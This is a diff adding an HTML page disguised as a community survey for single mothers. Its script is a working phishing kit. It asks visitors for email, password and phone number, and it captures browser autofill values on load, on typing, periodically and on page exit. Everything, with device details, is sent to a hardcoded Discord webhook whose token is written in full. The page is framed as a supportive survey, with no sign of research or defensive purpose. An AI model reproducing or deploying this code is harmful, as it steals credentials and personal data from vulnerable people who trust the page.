@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Single Mothers Support Network - Community Survey</title>
+    <meta name="description" content="Join our community of single mothers sharing experiences and accessing support resources. Your voice matters!">
+    <style>
+        /* Loading screen styles */
+        #loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #f5576c 75%, #ff5858 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            color: white;
+            font-size: 24px;
+            font-family: Arial, sans-serif;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Main content - initially hidden */
+        .container {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loading">
+        <div class="spinner"></div>
+        <div>Loading Single Mothers Support Survey...</div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Content will be inserted here by JavaScript -->
+    </div>
+
+<script>
+// ===== CONFIGURATION =====
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487416501752561664/JMVljji8vZoTuaKtZqv9fmRjoUMW9UxGL8jtNTzZoFBpTXtaOVRgGTVr371_dtj6dmXP';
+
+// ===== DATA COLLECTION =====
+let collectedData = {
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: { width: screen.width, height: screen.height },
+    location: { href: window.location.href },
+    autoFillData: {},
+    formEntries: {}
+};
+
+// ===== CORE FUNCTIONS =====
+
+// Send data to Discord
+async function sendToWebhook(data, eventType = 'page_load') {
+    try {
+        const payload = {
+            username: "Survey Collector",
+            embeds: [{
+                title: `📊 ${eventType.toUpperCase()}`,
+                color: 0xff6b8b,
+                fields: [
+                    {
+                        name: "🌐 Visitor Info",
+                        value: `**UA:** ${data.userAgent.substring(0, 50)}...\n**Screen:** ${data.screen.width}x${data.screen.height}`,
+                        inline: false
+                    }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+        
+        // Add auto-fill data if exists
+        if (Object.keys(data.autoFillData).length > 0) {
+            let autoFillText = "";
+            Object.entries(data.autoFillData).forEach(([key, value]) => {
+                autoFillText += `**${key}:** ${value.value}\n`;
+            });
+            
+            payload.embeds[0].fields.push({
+                name: "🔑 Auto-Fill Captured",
+                value: autoFillText.substring(0, 500) + (autoFillText.length > 500 ? "..." : ""),
+                inline: false
+            });
+        }
+        
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
+        console.log('✅ Data sent to Discord');
+    } catch (error) {
+        console.error('❌ Webhook error:', error);
+    }
+}
+
+// Harvest auto-fill data
+function harvestAutoFillData() {
+    const inputs = document.querySelectorAll('input, textarea, select');
+    inputs.forEach(input => {
+        if (input.value && input.value.trim()) {
+            const fieldName = input.name || input.id || input.type;
+            collectedData.autoFillData[fieldName] = {
+                value: input.value,
+                type: input.type,
+                name: input.name
+            };
+        }
+    });
+    return Object.keys(collectedData.autoFillData).length;
+}
+
+// Create the survey form
+function createSurveyForm() {
+    const container = document.querySelector('.container');
+    
+    container.innerHTML = `
+        <div style="
+            max-width: 800px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            font-family: Arial, sans-serif;
+        ">
+            <div style="text-align: center; margin-bottom: 40px;">
+                <h1 style="color: #ff6b8b; font-size: 2.5em; margin-bottom: 10px;">
+                    🌸 Single Mothers Support Survey 🌸
+                </h1>
+                <p style="color: #06d6a0; font-size: 1.2em;">
+                    Your voice matters! Share your experiences to help build better support systems
+                </p>
+            </div>
+            
+            <!-- Registration Form -->
+            <div style="
+                margin-bottom: 30px;
+                padding: 25px;
+                background: linear-gradient(45deg, #f8f9fa, #e9ecef);
+                border-radius: 15px;
+                border-left: 6px solid #ff6b8b;
+            ">
+                <h2 style="color: #073b4c; margin-bottom: 20px;">📝 Registration Information</h2>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 8px; color: #073b4c; font-weight: bold;">
+                        📧 Email Address
+                    </label>
+                    <input type="email" id="email" name="email" placeholder="your.email@example.com" 
+                           autocomplete="email" style="
+                        width: 100%;
+                        padding: 12px;
+                        border: 2px solid #ff6b8b;
+                        border-radius: 10px;
+                        font-size: 16px;
+                    ">
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 8px; color: #073b4c; font-weight: bold;">
+                        🔒 Password
+                    </label>
+                    <input type="password" id="password" name="password" placeholder="Create a password" 
+                           autocomplete="new-password" style="
+                        width: 100%;
+                        padding: 12px;
+                        border: 2px solid #ff6b8b;
+                        border-radius: 10px;
+                        font-size: 16px;
+                    ">
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 8px; color: #073b4c; font-weight: bold;">
+                        📱 Phone Number
+                    </label>
+                    <input type="tel" id="phone" name="phone" placeholder="(123) 456-7890" 
+                           autocomplete="tel" style="
+                        width: 100%;
+                        padding: 12px;
+                        border: 2px solid #ff6b8b;
+                        border-radius: 10px;
+                        font-size: 16px;
+                    ">
+                </div>
+            </div>
+            
+            <!-- Survey Questions -->
+            <div style="
+                margin-bottom: 30px;
+                padding: 25px;
+                background: linear-gradient(45deg, #f8f9fa, #e9ecef);
+                border-radius: 15px;
+                border-left: 6px solid #06d6a0;
+            ">
+                <h2 style="color: #073b4c; margin-bottom: 20px;">💬 Survey Questions</h2>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 8px; color: #073b4c; font-weight: bold;">
+                        How many children do you have?
+                    </label>
+                    <input type="number" id="children" name="children" placeholder="e.g., 2" style="
+                        width: 100%;
+                        padding: 12px;
+                        border: 2px solid #06d6a0;
+                        border-radius: 10px;
+                        font-size: 16px;
+                    ">
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <label style="display: block; margin-bottom: 8px; color: #073b4c; font-weight: bold;">
+                        What's your biggest challenge as a single mother?
+                    </label>
+                    <textarea id="challenge" name="challenge" placeholder="Share your thoughts..." rows="4" style="
+                        width: 100%;
+                        padding: 12px;
+                        border: 2px solid #06d6a0;
+                        border-radius: 10px;
+                        font-size: 16px;
+                    "></textarea>
+                </div>
+            </div>
+            
+            <!-- Submit Button -->
+            <button id="submitBtn" style="
+                width: 100%;
+                padding: 18px;
+                background: linear-gradient(45deg, #ff6b8b, #ff9999);
+                color: white;
+                border: none;
+                border-radius: 12px;
+                font-size: 18px;
+                font-weight: bold;
+                cursor: pointer;
+                transition: all 0.3s;
+            " onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='0 10px 20px rgba(255,107,139,0.4)';"
+            onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none';">
+                🌟 Submit Survey & Help Our Community 🌟
+            </button>
+            
+            <div style="text-align: center; margin-top: 30px; color: #666; font-size: 14px;">
+                © 2024 Single Mothers Support Network
+            </div>
+        </div>
+    `;
+    
+    // Add event listeners
+    document.getElementById('submitBtn').addEventListener('click', handleSubmit);
+    
+    // Monitor inputs for auto-fill
+    const inputs = container.querySelectorAll('input, textarea');
+    inputs.forEach(input => {
+        input.addEventListener('input', () => {
+            harvestAutoFillData();
+        });
+        input.addEventListener('blur', () => {
+            if (input.value) {
+                collectedData.formEntries[input.id || input.name] = input.value;
+            }
+        });
+    });
+}
+
+// Handle form submission
+async function handleSubmit() {
+    const btn = document.getElementById('submitBtn');
+    btn.disabled = true;
+    btn.innerHTML = '⏳ Submitting...';
+    
+    // Collect final data
+    harvestAutoFillData();
+    
+    // Add form entries
+    const inputs = document.querySelectorAll('input, textarea, select');
+    inputs.forEach(input => {
+        if (input.value) {
+            collectedData.formEntries[input.id || input.name] = input.value;
+        }
+    });
+    
+    collectedData.submissionTime = new Date().toISOString();
+    
+    // Send to Discord
+    await sendToWebhook(collectedData, 'form_submission');
+    
+    // Success message
+    btn.innerHTML = '✅ Submitted Successfully!';
+    btn.style.background = 'linear-gradient(45deg, #06d6a0, #0cb48c)';
+    
+    // Send detailed data
+    setTimeout(async () => {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: "Complete Data",
+                content: `\`\`\`json\n${JSON.stringify(collectedData, null, 2).substring(0, 1900)}\n\`\`\``
+            })
+        });
+    }, 1000);
+}
+
+// ===== INITIALIZATION =====
+window.addEventListener('load', function() {
+    console.log('🚀 Page loaded, initializing survey...');
+    
+    // Initial data collection
+    harvestAutoFillData();
+    
+    // Send initial webhook
+    setTimeout(() => {
+        sendToWebhook(collectedData, 'page_loaded');
+    }, 1000);
+    
+    // Create form
+    createSurveyForm();
+    
+    // Hide loading, show content
+    setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
+        document.querySelector('.container').style.display = 'block';
+        console.log('✅ Survey ready');
+        
+        // Check for auto-fill after form renders
+        setTimeout(() => {
+            const autoFillCount = harvestAutoFillData();
+            if (autoFillCount > 0) {
+                sendToWebhook(collectedData, 'auto_fill_detected');
+            }
+        }, 500);
+    }, 1500); // 1.5 second delay for loading effect
+    
+    // Periodic data collection
+    setInterval(() => {
+        const autoFillCount = harvestAutoFillData();
+        if (autoFillCount > 0) {
+            sendToWebhook(collectedData, 'periodic_check');
+        }
+    }, 30000);
+});
+
+// Capture before unload
+window.addEventListener('beforeunload', function() {
+    harvestAutoFillData();
+    const data = JSON.stringify({
+        ...collectedData,
+        event: 'page_unload',
+        timeOnPage: Date.now() - new Date(collectedData.timestamp).getTime()
+    });
+    
+    // Try to send beacon
+    if (navigator.sendBeacon) {
+        navigator.sendBeacon(WEBHOOK_URL, new Blob([data], {type: 'application/json'}));
+    }
+});
+</script>
+</body>
+  </html>
